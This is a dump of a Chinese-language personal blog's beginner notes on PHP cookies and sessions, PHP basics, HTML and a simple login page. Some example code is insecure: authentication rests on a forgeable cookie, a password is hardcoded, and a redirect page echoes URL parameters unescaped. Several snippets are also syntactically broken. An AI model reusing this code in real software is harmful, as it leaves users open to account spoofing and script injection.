mySQL中的DDL语句和DML语句都是常用的语句，总结下来，多回顾回顾。","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://bealright.github.io/tags/PHP/"}]},{"title":"PHP会话控制","slug":"PHP学习总结(会话控制)","date":"2019-04-20T08:38:24.000Z","updated":"2019-06-09T12:00:16.514Z","comments":true,"path":"2019/04/20/PHP学习总结(会话控制)/","link":"","permalink":"http://bealright.github.io/2019/04/20/PHP学习总结(会话控制)/","excerpt":"","text":"最近刚做完一个简易的登陆注册小项目，当时做的时候匆忙，现在来详细的了解一下PHP会话控制这方面的知识。 cookie和seesion技术出现的原因： 当一个用户请求一个页面时，再请求同一个网站上的另外一个页面时，HTTP协议不能告诉我们两个请求是否来自同一个用户，也不能将两次访问联系到一起！所有出现了cookie和seesion. 一、cookiecookie是用来将网站的资料记录在客户端的技术，让web服务器将一些资料存放在客户端（用户的电脑中）。 1、向客户端电脑中设置cookie1setcookie(); 2、在服务器端上读取cookie内容1$_COOKIE 3、将多维数组应用于cookie中例如：12setcookie(\"member[name]\",'www',time()+3600);setcookie(\"member[email]\",'1111',time()+3600); 4、删除cookie例如：12345678setcookie(\"member[name]\",'',time()-3600);setcookie(\"member[email]\",'',time()-3600);//也可以采用遍历的方法foreach ($_COOKIE['member'] as $key=&gt;$val)&#123; var_dump(setcookie(\"member[&#123;$key&#125;]\",'',time()-3600)); &#125;//注意点： 使用setcookie删除cookie的时候，需要与当初设置cookie的时候参数一致！ 二、sessionsession与cookie最大的不同就是,session是把具体信息保存在服务器端。 1、开启session例如：12345session_start();$_SESSION['name']='www';$_SESSION['email']='sss';$_SESSION['url']='zzz';/再另一个PHP文件中访问的时候必须加上 2、打开已存在的seesion12session_start();var_dump($_SESSION);/注意打开之前一定要先开启seesion 3、注销变量与销毁session先开启session123456789session_start(); session_unset();/释放所有变量 session_destroy();/销毁一个会话中的所有数据 setcookie('')/名字可以在设置session时，使用var_dump($_COOKIE)来获取cookie的名字 /也可以使用这样的方法 setcookie(session_name(),'',time()-3600);//销毁保存在客户端的cookie /但这样的方法删除的不干净 /可以采用这样的方法删除干净 setcookie(session_name(),'',time()+3600,'/');'/'表示设置cookie的根目录 三、基于session和cookie的登陆模块简易的用cookie来判断登陆login.php(登陆文件) 1234567891011121314151617181920212223242526272829303132333435&lt;?php header('Content-type:text/html;charset=utf-8'); if (isset($_COOKIE['username']) &amp;&amp; $_COOKIE['username']==='QTFY') &#123; exit('您已经登录请不要重复登录'); &#125; if(isset($_POST['submit']))&#123; if(isset($_POST['username'])&amp;&amp; isset($_POST['password']) &amp;&amp; $_POST['username']==='QTFY' &amp;&amp; $_POST['password']==='123')&#123; if(setcookie('username',$_POST['username'],time()+3600))&#123; header('Location:login.php'); &#125; else&#123; echo 'cookie设置失败！'; &#125; &#125; else &#123; header('Location:skip.php?url=login.php&amp;info=用户名或密码输入错误'); //应用跳转页面 &#125; &#125; ?&gt; &lt;!DOCTYPE html&gt; &lt;html lang=\"zh-CN\"&gt; &lt;head&gt; &lt;meta charset=\"utf-8\" /&gt; &lt;title&gt;请登录&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form method=\"post\" action=\"login.php\"&gt; 姓名：&lt;input type=\"text\" name=\"username\" /&gt; 密码：&lt;input type=\"password\" name=\"password\" /&gt; &lt;input type=\"submit\" name=\"submit\" value=\"登录\" /&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; index.php(判断是否有cookie以此来进行识别用户身份)1234567&lt;?php header('Content-type:text/html;charset=utf-8'); if(isset($_COOKIE['username']) &amp;&amp; $_COOKIE['username']==='QTFY')&#123; echo \"&#123;$_COOKIE['username']&#125;你好，欢迎回来!\"; &#125;else&#123; echo \"&lt;a href='login.php'&gt;请重新登陆&lt;/a&gt;\"; ?&gt; 这样就可以做一个简易的登陆页面（带判断）skip.php(简单的跳转页面)12345678910111213141516171819&lt;?php header('Content-type:text/html;charset=utf-8'); if(!isset($_GET['url'])|| !isset($_GET['info']))&#123; exit(); &#125; &#125; ?&gt; &lt;!DOCTYPE html&gt; &lt;html lang=\"zh-CN\"&gt; &lt;head&gt; &lt;meta charset=\"utf-8\" /&gt; &lt;meta http-equiv=\"refresh\" content=\"3;URL=&lt;?php echo $_GET['url']?&gt;\"/&gt;//3秒 &lt;title&gt;正在跳转&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div style=\"text-align:center;font-size:20px;\"&gt;&lt;?php echo $_GET['info'] ?&gt;,三秒后自动跳转&lt;/div&gt; /info提示信息 &lt;/body&gt; &lt;/html&gt; loginout(注销功能页面)12345678910&lt;?php header('Content-type:text/html;charset=utf-8'); if (isset($_COOKIE['username']) &amp;&amp; $_COOKIE['username']==='QTFY') &#123; if(setcookie('username',$_POST['username'],time()-3600))&#123; header('Location:skip.php?url=index.php&amp;info=注销成功，正在跳转中！'); &#125;else&#123; header('Location:skip.php?url=index.php&amp;info=注销失败，请稍后重试！'); &#125; &#125;?&gt; 这样基于cookie的登陆页面就基本实现了session与cookie基本相同要注意：用session时，首先开启session。 这里就不演示了，具体的看之前做的登陆注册页面。这里又学到了一个跳转页面，之前都不知道如何用。","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://bealright.github.io/tags/PHP/"}]},{"title":"PHP概念、基本语法、流程控制","slug":"PHP学习(php概念、基本语法、流程控制)","date":"2019-04-18T02:38:24.000Z","updated":"2019-06-09T12:00:23.547Z","comments":true,"path":"2019/04/18/PHP学习(php概念、基本语法、流程控制)/","link":"","permalink":"http://bealright.github.io/2019/04/18/PHP学习(php概念、基本语法、流程控制)/","excerpt":"","text":"一、初识PHP1.PHP开始标记 1&lt;?php 2.PHP结束标记1?&gt; 3.页面最终是通过HTML，CSS，JS来进行展示的 **4.PHP代码可以嵌入html代码中，可以嵌入到任意位置，并且可以嵌入多个php代码，必须在php文件中嵌入才生效。** 如果建立的是html文件，中间嵌有php代码，apache默认是不会将文件传送到PHP应用服务器，因为建立的是HTML文件，会直接返回给请求方。 5.文件末尾的？&gt;结束标签可以省略 6.指令分隔符** ； 1.在一些PHP语句的结尾要加上 ；表示一句话的结束。 2.结束标记?&gt;隐含了一个 ； 所以在?&gt;之前的PHP语句可以省略掉 ； 7.注释 多行注释 / 多行注释 / 单行注释 //单行注释 8.空白的处理**空格，tab制表符，换行 这些写在PHP代码里是没有影响的可以利用这些来增加代码的可读性。 二、变量 变量是用于临时存储值的容器 1.变量的声明​ 在其他语言中，在使用变量前，事先声明一下！ 注意：在PHP程序中，使用变量之前是不需要声明的！（可以直接使用） 变量用于存储 数字、文本字符串 或者数组的！ $变量名=数据（值） 2.变量的销毁​ unset($变量名称) 3.变量的命令规则​ 1.变量名称严格区分大小写 $name,$NAME,$Name都是不同的变量 2.字母或者下划线开头 总结：变量名只能包含 字母 数字 下划线并且以字母或者下划线开头！ 注意：最好不要用关键字作为变量名称 4.可变变量例如： 12345&lt;?php $a='b'//定义一个变量a储存值b $$a='c'//$b='c' echo $b;?&gt; 输出结果为：1c 5.变量的引用赋值引用赋值相当于给变量加了一个别名 12345&lt;?php $b=&amp;$a;//相当于给$a起了一个别名 $b=20; echo $a;?&gt; 输出结果：120 三、变量类型 PHP是一种弱语言 概述：变量类型是指保存在该变量中的数据类型 1.变量类型简介​ bool（布尔型） 在变量里存true 或 false 那么这个变量就是布尔类型 以下值被认为是false，其他值都是被认为是true 布尔值 false 0 浮点型0.0 空白字符串和字符串0//指的是直接一对单引号或者双引号，里面没有如何内容 例如： 1var_dump((bool)\"\")或var_dump((bool)'') 没有成员的数组1var_dump((bool)array()); NULL例如：1var_dump((bool)NULL); 输出结果 都为： bool(false) int（整形）在变量里面存整数，那么这个变量就是整形变量. float（浮点型，也称double）在变量里面存小数，那么这个变量就是浮点型数据. string（字符串）需要加单引号或者双引号例如：1234&lt;?php $a='t'; var_dump($a);?&gt; var_dump($变量名)//将变量值和类型一起输出 单引号PHP不会解析单引号之间的变量 双引号其中的变量名会被变量值代替，即PHP会解析双引号之间的变量例如：123456&lt;?php $b=100; $a=\"te&#123;$b&#125;st\"; var_dump($a); echo $a; ?&gt; 输入结果:12string te100stte100xt 定界符&lt;&lt;&lt;名字 名字；定界符可以包含单引号、双引号、也可以解析变量例如：1234567&lt;?php $b=200; $a=&lt;&lt;&lt;abc; wwwww&#123;$b&#125;w abc; var_dump($a) ?&gt; 输出结果：1string wwwww200w array(数组)objec（对象）resource（资源）NULL例如：1234&lt;?php $a=null; var_dump($a); ?&gt; 输出结果:1null 二、变量类型相互转化变量类型强制转化例如： 12345&lt;?php $a='www'; $b=(int)$a; var_dump($b); ?&gt; 输出结果：1int 0 四、常量 常量是用于临时（只有在我们的程序的运行过程中才存在）存储值（数据）的容器 定义和使用define(‘常量名称’，常量值)或者define(“常量名称”，常量值)例如:1234&lt;?php define('WWW',10) echo WWW ?&gt; 输出结果：10 常量的命名： 1.和变量一样 只能包含字母、数字、下划线 并且必须以字母或下划线开头。 2.按照惯例常量的名称总是大写的。 3.自定义常量总是严格区分大小写的！ 常量和变量的区别 1.常量前面没有没有符号$ 2.常量只能用define()函数来定义，不能通过赋值语句来定义 3.常量可以不用理会变量范围的规则而在任何地方定义和使用 4.常量一旦被定义就不能重新定义或者取消定义 5.常量的值只能是bool,int,float,string类型 预定义常量 预定义常量是PHP已经定好了的常量 有的预定义常量是以_开头，这些预定义常量叫做魔术常量 代码所在的位置不同 值也是不同的。 1234例如： _LINE_ _FILE_//这些都是魔术常量预定义常量是不区分大小写的 五、运算符 概述： 运算符是对一个或者多个操作数（变量或者数值）执行某种运算的符号，也称操作符！ 算术运算符1 .+例如： 12345&lt;?php $a=1; $b=2; echo $a+$b; ?&gt; 输出结果：3 -第一个意思：减号第二个意思：取反 1234&lt;?php $a=1; -$a;?&gt; 输出结果：-1取反并不会影响到被取反变量本身的值！ *例如：123456&lt;?php &amp;a=1; &amp;b=2; $c=$a*$b; echo $c;?&gt; 输出结果：2 /例如：12345&lt;?php $a=10; $b=2; echo $a/$b;?&gt; 输出结果：5 5.%取模（取余）例如：12345&lt;?php $a=10; $b=3; echo $a%$b; ?&gt; 输出结果： 1 6.++自增例如:12345&lt;?php $a=1; ++$a; echo $a;?&gt; 输出结果： 2 如果 ++在变量之后例如：1234&lt;?php $a=1; echo $a++; ?&gt; 输出结果: 1 7.-- 自减例如：12345&lt;?php $a=10; $a--; echo $a;?&gt; 输出结果： 9 1234&lt;?php $a=10; echo $a--;?&gt; 输出结果： 10 注意：自增自减是对变量来说的！ 字符串运算符1 . 连接运算符例如： 123456&lt;?php $a='i'; $b='is'; $c='hacker'; echo $a.$b.$c;?&gt; 输出结果： iamhacker 2 = 赋值运算符 注意：赋值运算符整个语句是有值的，所以整个语句就是一个表达式，所以我们也可以怎么写： $a=$b=2;相当于$a=($b=2) 把右边的值赋给左边的变量 二元运算符+=运算符 例如：123456&lt;?php $a=1; $b=2; $a+=$b; echo $a;?&gt; 输出结果： 3 -=运算符123456&lt;?php $a=2; $b=1; $a-=$b; echo $a; ?&gt; 输出结果： 1 除此之外，赋值运算符还有 *= /= %= .= 比较运算符 PHP中规定： 使用echo输出布尔类型值的时候 echo true;它在页面中会输出1 echo false;它会在页面中什么都不输出 需要输出布尔类型值的时候最好使用var_dump()这个函数来输出 对操作数（按照比较运算符的要求，规则）进行比较 如果比较出的结果满足比较运算符的要求那么结果就是true（真，成立），否则就是false(假，不成立) 1.==比较左右两边数的值是否相等例如：12345&lt;?php $a=1; $b=1; var_dump($a==$b);?&gt; 输出结果：1bool(true) 2.===全等（值要相等，类型也要相等）例如：12345&lt;?php $a=11; $b='11'; var_dump($a===$b); ?&gt; 输出结果： bool(false) 3.!= 比较值是否不相等 例如：12345&lt;?php $a=1; $b=11; var_dump($a!=$b);?&gt; 输出结果： bool(true) 4.&lt;&gt; 比较值是否不相等5.!==不全等如果两边的操作数不全等那么就是true, 否则就是false php会自动转化类型例如： 12345&lt;?php $a=11; $b='11'; var_dump($a!=$b);?&gt; 输出结果：1bool(false) 12345&lt;?php $a=11; $b='11'; var_dump($a!==$b); ?&gt; 输出结果:1bool(true) 因为类型不一样 6.&lt; 小于比较两边的操作数例如：12345&lt;?php $a=1; $b=1; var_dump($a&lt;$b); ?&gt; 输出结果：1bool(false) 7.&gt; 大于 8. &lt;= 小于等于 9. &gt;= 大于等于 逻辑运算符 概念： 对表达式进行逻辑运算，运算出的结果是布尔类型的值(true,false) 要求： 参与逻辑运算的表达式的值是布尔类型的值，如果不是布尔类型的值会被PHP自动转化成布尔类型的值，然后参与运算。 1.逻辑与 and 或者 &amp;&amp; 左右两边的表达式的值都为true时，运算结果为true。只要其中有一个false，结果就是false。例如：12345&lt;?php $a=true; $b=true; var_dump( $a &amp;&amp; $b); ?&gt; 输出结果：1bool(true) 短路问题： 语言规定： 只要有逻辑运算符（逻辑与、逻辑或）那么运算结果就是一个true或false例如：123456&lt;?php $a=false; $b=1; $a &amp;&amp; ++$b; echo $b; ?&gt; 输出结果： 1 2.逻辑或 or 或者 || 左右两边的表达式的值有一个为true，运算的结果就是true ,只有当两边的值都是false的时候，结果才会是false。 例如：12345&lt;?php $a=true; $b=false; var_dump($a || $b) ?&gt; 输出结果：1bool(true) 短路问题：123456&lt;?php $a=true; $b=1; &amp;a || $ ++b; echo $b; ?&gt; 输出结果： 1 3.逻辑异或 xor 运算规则：左右两边表达式的值不一样的时候结果就是true，如果一样那么结果就是false例如：12345&lt;?php $a=false; $b=true; var_dump($a xor $b); ?&gt; 输出结果：1bool(true) 4.逻辑非 ！ 运算规则：将原来的表达式的值否定掉，原来是true，那么结果就是false例如：1234&lt;?php $a=false; var_dump(!$a); ?&gt; 输出结果： 1bool(true) 5.其他运算符1.？：三元运算符格式： 表达式1?表达式2:表达式3：如果表达式1的值为true，那么就执行表达式2，否则就执行表达式3例如：1234&lt;?php $a=true ? 10 : 20; echo $a; ?&gt; 输出结果：110 2.@屏蔽表达式可能发送错误；在表达式前面加上@ 6.运算符的优先级优先级的概念： 谁的优先级别高，就先执行谁 结合方向 规定了从那个方向开始算的问题 优先级归纳： 1)[结合方向：无]递增递减 2)[右]逻辑非! 3)[左]乘，除，取余 4)[左]加，减，字符串连接符 5)[无]包含大于号或者小于号的比较运算符 6)[无]不包含大于号或者小于号的比较运算符 7)[左]逻辑与&amp;&amp; 8)[左]逻辑或|| 9)[左]? : 10)[右]赋值运算符 12)[左 ]逻辑异或xor 园括号的作用： 用圆括号可以将表达式里面的某一块看成一个整体例如：1234&lt;?php $a=(1+5)*3 echo $a; ?&gt; 输出结果：118 另外使用括号可以增强代码的可读性 流程控制【1】-if语句：1.顺序执行 自上而下执行即可 对执行过程没有控制2.分支执行分支执行可以根据条件是否满足来选择某些代码，PHP的分支执行主要是通过两种语句（if\\switch）来实现 1.if语句：1)单向条件if（表达式） 语句； 表达式的值为true，那么就执行语句1，否则就不执行！例如：123456&lt;?php $a=400; $b=40; if($a&gt;$b) echo \"1\"; echo \"2\"; ?&gt; 输出结果：112 流程控制【2】-switch语句：1234567891011switch(表达式)&#123; case 值 1://case相当于== 语句块1; break; case 值 2: 语句块2; break; ....... default: 语句块n &#125; 循环语句：1.while语句123while(表达式)&#123; 各种语句.... &#125; 2.do…while语句123do&#123; 各种语句 &#125;while(表达式); 3.for语句123for(表达式a;表达式b;表达式c)&#123; 各种语句 &#125; 特殊的流程控制语句1.break语句 2.continue语句 3.exit()语句 作用：结束当前整个程序的执行！","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://bealright.github.io/tags/PHP/"}]},{"title":"HTML学习总结","slug":"HTML学习总结","date":"2019-03-24T07:38:24.000Z","updated":"2019-06-07T07:53:14.308Z","comments":true,"path":"2019/03/24/HTML学习总结/","link":"","permalink":"http://bealright.github.io/2019/03/24/HTML学习总结/","excerpt":"","text":"HTML的基本结构1234567891011&lt;!DOCTYPE html&gt;&lt;!--文档类型--&gt;&lt;html lang=\"zh\"&gt;&lt;!--加上lang属性声明语言--&gt;&lt;head&gt;&lt;meta charset=\"UTF-8\"&gt;&lt;!--利用UTF-8格式来解析--&gt;&lt;title&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; HTML——文本文本标签 12345&lt;p&gt;段落标签&lt;/p&gt;&lt;h&gt;标题标签&lt;/h&gt;&lt;br&gt;换行标签（单标签）&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;xxx&lt;/p&gt;&lt;!--&amp;nbsp;代表空格--&gt; 文本格式化标签12345&lt;strong&gt;文本加粗标签&lt;/strong&gt;&lt;em&gt;斜体标签&lt;/em&gt;&lt;del&gt;删除标签&lt;/del&gt;&lt;span&gt;&lt;/span&gt;&lt;p&gt;&lt;strong&gt;&lt;em&gt;&lt;del&gt;phpStudy是一个PHP调试环境的程序集成包&lt;/del&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt; 输出结果：phpStudy是一个PHP调试环境的程序集成包 HTML_图片1234567&lt;img&gt;图像标签&lt;img src=\"\"&gt;&lt;!--src属性放图片--&gt;&lt;img src=\"\" alt=\"\"&gt;&lt;!--alt属性当图片显示不出来时作为可替换文本--&gt;&lt;img src=\"\" alt=\"\" title=\"\"&gt;&lt;!--title属性 点击图片会出现相应的文字--&gt; 图片格式： jpg 有损压缩 影响画质 图片小png 无损压缩 不影响画质 大 有透明通道gif 动图 图片方式： 网络图片 本地图片：相对路径：从当前路径算起的路径 绝对路径：从盘符算起的路径 例如： 相对路径：01.jpg绝对路径：C:\\Users\\用户名\\Pictures\\桌面壁纸\\01.jpg HTML——超链接123456789&lt;a&gt;超链接标签&lt;/a&gt;&lt;a href=\"\" &gt;文本&lt;/a&gt;&lt;!--href属性 填写文件或网页地址--&gt;&lt;a href=\"\" target=\"_balnk\"&gt;文本&lt;/a&gt;&lt;!--target属性保留原来的界面--&gt;&lt;a href=\"\" target=\"_balnk\"&gt; &lt;img src=\"\" alt=\"\"&gt; &lt;!--放图片--&gt;&lt;/a&gt; 例如：1&lt;a href=\"https://www.bilibili.com/\" target=\"_balnk\"&gt;bilibili&lt;/a&gt; 123&lt;a href=\"https://www.bilibili.com/\" target=\"_balnk\"&gt; &lt;img src=\"u=3745332628,2276842928&amp;fm=27&amp;gp=0.jpg\" alt=\"bilibili\"&gt;&lt;/a&gt; 书签标签 锚点1234567&lt;a href=\"#end\"&gt;回到页面最下面&lt;/a&gt;&lt;p&gt;段落&lt;/p&gt;...&lt;p id=end&gt;最后一段段落&lt;/p&gt;&lt;!--直接跳转到最后一个段落--&gt; 如图所示： 图片的映射 shape属性 形状 circle 园 rect 矩形 poly 多边形coords属性 坐标点 例如：1234567&lt;img src=\"2.jpg\" alt=\"\" usemap=\"#bili\"&gt; &lt;map name=\"bili\"&gt;地图 &lt;area shape=\"circle\" coords=\"184,245,100\" href=\"https://www.bilibili.com/\" alt=\"\"&gt;可点击区域 &lt;area shape=\"rect\" coords=\"\" href=\"https://www.bilibili.com/\" alt=\"\"&gt;可点击区域 &lt;/map&gt;&lt;!-- 园coords=“中心坐标，园的半径”--&gt;&lt;!--矩形coords=“左上角点的坐标，右下角点的坐标”--&gt; HTML列表 列表有三类1无序列表：内容列表 ，标签ul+li 无顺序关系2有序列表：内容列表 标签ol+li 有顺序关系3自定义列表： 内容标题+内容 列表 标签dl+dt+dd 例如：12345678&lt;ul&gt;&lt;li&gt;无序列表&lt;/li&gt;&lt;li&gt;无序列表&lt;/li&gt;&lt;li&gt;无序列表&lt;/li&gt;&lt;li&gt;无序列表&lt;/li&gt;&lt;li&gt;无序列表&lt;/li&gt;&lt;li&gt;无序列表&lt;/li&gt;&lt;/ul&gt; 1234567&lt;ol&gt;&lt;li&gt;有序列表&lt;/li&gt;&lt;li&gt;有序列表&lt;/li&gt;&lt;li&gt;有序列表&lt;/li&gt;&lt;li&gt;有序列表&lt;/li&gt;&lt;li&gt;有序列表&lt;/li&gt;&lt;/ol&gt; HTML——表格1234567&lt;table&gt;表格标签&lt;/table&gt;&lt;tr&gt;行标签&lt;/tr&gt;&lt;th&gt;标题标签&lt;/th&gt;&lt;td&gt;内容标签&lt;/td&gt;&lt;table border=\"\"&gt;&lt;td colspan=\"填写需要的列数\"&gt;&lt;/td&gt;&lt;td rowspan=\"填写需要的行数\"&gt;&lt;/td&gt; colspan属性单元格可横跨的列数rowspan属性单元格可横跨的行数border属性加边框 例如：1234567891011121314&lt;table&gt;&lt;tr&gt;&lt;th&gt;班级&lt;/th&gt;&lt;th&gt;姓名&lt;/th&gt;&lt;th&gt;学号&lt;/th&gt;&lt;th&gt;成绩&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;3&lt;/td&gt;&lt;td&gt;4&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt; 12加边框&lt;table border=\"1\"&gt; 12&lt;td colspan=2&gt;1&lt;/td&gt;&lt;td rowspan=2&gt;2&lt;/td&gt; HTML表单 表单是用来收集用户输入 提交给服务器http: 超文本传输协议 浏览器和服务器的通讯。模式： 请求——应答 浏览器主动发起请求 服务器接收服务器做处理 返回给浏览器 浏览器显示结果。12345&lt;form action=\"\"&gt;表单标签&lt;/form&gt;用户名&lt;input type=\"text\" name=\"自己所取的名字\"&gt;密码&lt;input type=\"password\" name=\"自己设定的密码\"&gt;&lt;!--name属性是告诉浏览器 填入的东西是用户名或密码--&gt;提交按钮&lt;input type=\"submit\"&gt; 例如：12345&lt;form action=\"\"&gt; 用户名&lt;input type=\"text\" name=\"woo\"&gt; 密码&lt;input type=\"password\" name=\"iii\"&gt; &lt;input type=\"submit\"&gt;&lt;/form&gt; 单选框12&lt;input type=\"radio\" name=\"\"&gt;&lt;!--注意名字要保持一致，否则不是一组--&gt; 例如：1234&lt;form action=\"\"&gt; &lt;input type=\"radio\" name=\"sex\"&gt;男 &lt;input type=\"radio\" name=\"sex\"&gt;女&lt;/form&gt; 复选框1&lt;input type=\"checkbox\" name=\"\"&gt; 例如：1234&lt;form action=\"\"&gt; &lt;input type=\"checkbox\" name=\"sex\"&gt;男 &lt;input type=\"checkbox\" name=\"sex\"&gt;女&lt;/form&gt; 下拉框123&lt;select name=\"\"&gt; &lt;option value=\"\"&gt;文本&lt;/option&gt;&lt;/select&gt; 例如：12345678&lt;form action=\"\"&gt;城市：&lt;select name=\"城市\"&gt; &lt;option value=\"\"&gt;武汉&lt;/option&gt; &lt;option value=\"\"&gt;郑州&lt;/option&gt; &lt;option value=\"\"&gt;北京&lt;/option&gt; &lt;option value=\"\"&gt;广州&lt;/option&gt;&lt;/select&gt;&lt;/form&gt; 12345如果提交服务器则需要value属性&lt;input type=\"\" name=\"\" value=\"\"&gt;action属性 提交给网页 可以跳转到该网页&lt;form action=\"\"&gt;&lt;/form&gt; 例如：123456&lt;form action=\"https://www.bilibili.com/\" &gt; 用户名&lt;input type=\"text\" name=\"woo\"&gt; 密码&lt;input type=\"password\" name=\"iii\"&gt; &lt;input type=\"submit\"&gt;&lt;/form&gt;&lt;！--输入用户名和密码后会跳转到指定的网页上--&gt; HTML有两种请求方式 POST GET区别: GET 请求会将get的内容会放在网址里面。 如:![在这里插入图片描述](https://github.com/bealright/bealright.github.io/blob/master/htmlstudyphoto/15.png?raw=true) POST请求会将post的内容放在http的head里面 如： ![在这里插入图片描述](https://github.com/bealright/bealright.github.io/blob/master/htmlstudyphoto/16.png?raw=true) 此时网址不发生任何变化 HTML嵌套规则 块元素：独立成一行 可以设置宽高 默认宽高100% 文字类块元素：12&lt;p&gt;&lt;/p&gt;标签&lt;h&gt;&lt;/h&gt;标签 容器类块元素：12345678910111213标签有：&lt;div&gt;&lt;/div&gt;&lt;table&gt;&lt;/table&gt;&lt;tr&gt;&lt;/tr&gt;&lt;td&gt;&lt;/td&gt;&lt;th&gt;&lt;/th&gt;&lt;form&gt;&lt;/form&gt;&lt;ul&gt;&lt;/ul&gt;&lt;li&gt;&lt;li&gt;&lt;ol&gt;&lt;/ol&gt;&lt;dl&gt;&lt;/dl&gt;&lt;dt&gt;&lt;/dt&gt;&lt;dd&gt;&lt;/dd&gt; 行元素：不独立成一行。12345678标签有：&lt;a&gt;&lt;img&gt;&lt;input&gt;&lt;strong&gt;&lt;em&gt;&lt;del&gt;&lt;span&gt; 特殊元素：12&lt;br&gt;&amp;nbsp; 嵌套规则 一：块元素可以嵌套行元素1&lt;div&gt; &lt;a href=\"\"&gt; &lt;/a&gt; &lt;/div&gt; 二：行元素可以嵌套行元素1&lt;a href=\"\" &gt; &lt;strong&gt; &lt;/strong&gt; &lt;/a&gt; 三：行元素不可以嵌套块元素12&lt;a href=\"\"&gt; &lt;div&gt; &lt;/div&gt; &lt;/a&gt;这个便是错误的 四：文字类块元素不可以嵌套块元素 五：容器类块元素 可以嵌套块元素1&lt;div&gt;&lt;p&gt;&lt;/p&gt;&lt;/div&gt;","categories":[],"tags":[{"name":"HTML","slug":"HTML","permalink":"http://bealright.github.io/tags/HTML/"}]},{"title":"本地搭建简易的登陆注册网页","slug":"HTML+CSS+PHP+COOKIE在本地搭建一个简易的登陆注册网页","date":"2019-03-20T02:38:24.000Z","updated":"2019-06-07T07:53:19.698Z","comments":true,"path":"2019/03/20/HTML+CSS+PHP+COOKIE在本地搭建一个简易的登陆注册网页/","link":"","permalink":"http://bealright.github.io/2019/03/20/HTML+CSS+PHP+COOKIE在本地搭建一个简易的登陆注册网页/","excerpt":"","text":"昨天晚上看了一叶飘零大佬的直播，大佬说：初学者最好自己先动手去做一些项目，这样能更好的了解原理，恰好学长要求做一个简易的登陆注册系统，利用这个机会再学习一波。 做了两天，搞懂了很多概念，也遇到了很多问题，但是这个过程特别有意思，记录一下，把那些学到的知识也总结一下。 一：准备工作打开mySQL打开网站根目录这里我直接放在了WWW目录下，有点乱。这样准备工作就做好了，开始奋斗了。 开始之前把我写的php文件简单描述一下：login.php（登陆页面)logincookie.php（连接数据库+设置cookie页面）welcome.php (判断是否有cookie以防绕过+登陆后呈现的页面)end.php (清除cookie页面)Register.php (注册页面)linkmysql.php（注册时连接数据库页面）Register link.php（注册判断是否注册成功和导入数据库用户信息页面）fail.php (登陆失败页面) 二：创建登陆页面和注册页面 感悟：那句话怎么说，学到用时方恨少，差不多就这个意思，之前学过HTML和CSS，但一自己写。。。，就会写个简单的表单，无非就是加一个外部样式CSS改一下背景颜色什么的。。。所以还得查大佬的。 这个样式干净又好看（自己认为），所以模仿，但是并非是复制粘贴，自己一步一步敲。。。（下面是转载自mind_programmonkey 大佬的CSS)12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364html&#123; width: 100%; height: 100%; overflow: hidden; font-style: sans-serif;&#125;body&#123; width: 100%; height: 100%; font-family: 'Open Sans',sans-serif; margin: 0; background-color: #4A374A;&#125;#login&#123; position: absolute; top: 50%; left:50%; margin: -150px 0 0 -150px; width: 300px; height: 300px;&#125;#login h1&#123; color: #fff; text-shadow:0 0 10px; letter-spacing: 1px; text-align: center;&#125;h1&#123; font-size: 2em; margin: 0.67em 0;&#125;input&#123; width: 278px; height: 18px; margin-bottom: 10px; outline: none; padding: 10px; font-size: 13px; color: #fff; text-shadow:1px 1px 1px; border-top: 1px solid #312E3D; border-left: 1px solid #312E3D; border-right: 1px solid #312E3D; border-bottom: 1px solid #56536A; border-radius: 4px; background-color: #2D2D3F;&#125;.but&#123; width: 300px; min-height: 20px; display: block; background-color: #4a77d4; border: 1px solid #3762bc; color: #fff; padding: 9px 14px; font-size: 15px; line-height: normal; border-radius: 5px; margin: 0;&#125;--------------------- 作者：mind_programmonkey 来源：CSDN 原文：https://blog.csdn.net/Mind_programmonkey/article/details/78522494 这是我的HTML代码123456789101112131415161718192021222324&lt;?php?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;请登陆&lt;/title&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" media=\"screen\" href=\"1.css\"&gt; &lt;script src=\"main.js\"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"login\"&gt; &lt;h1&gt;login&lt;/h1&gt; &lt;form action=\"logincookie.php\" method=\"post\"&gt; &lt;input type=\"text\" name=\"username\" placeholder=\"用户名\" /&gt;&lt;input type=\"password\" name=\"password\" placeholder=\"密码\" /&gt; &lt;br /&gt; &lt;button class=\"tj\" type=\"submit\"&gt;登陆&lt;/button&gt; &lt;/form&gt; &lt;form action=\"Register.php\" method=\"post\"&gt; &lt;button class=\"zc\" type=\"submit\"&gt;注册&lt;/button&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 做之前没有懂其中的一些东西，现在做完了把之前不懂的弄懂。（下面是我的，就是一些值改过）123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172body &#123; width: 100px; height: 100px; background-color: beige; background-image: url(28.jpg);//加一张图片&#125;#login&#123; position: absolute;//通过绝对定位，元素可以放置到页面上的任何位置。下面的标题距离页面左侧 50%，距离页面顶部 50%。 top:50%; left:50%; margin: -150px 0 0 -150px;//这个简写属性设置一个元素所有外边距的宽度，或者设置各边上外边距的宽度。该属性可以有 1 到 4 个值，上外边距是 -150px，右外边距是 0px，下外边距是 0px，左外边距是 -150px width: 300px; height: 300px;&#125;#login h1&#123; color: #9393FF; text-shadow: 0 0 10px;//text-shadow 属性向文本设置阴影,其他添加的效果可以在W3school查到。 letter-spacing: 1px;//letter-spacing 属性增加或减少字符间的空白（字符间距） text-align: center;//text-align 属性规定元素中的文本的水平对齐方式，这里是居中对齐。&#125;h1 &#123; font-size: 2em; margin: 0.67em 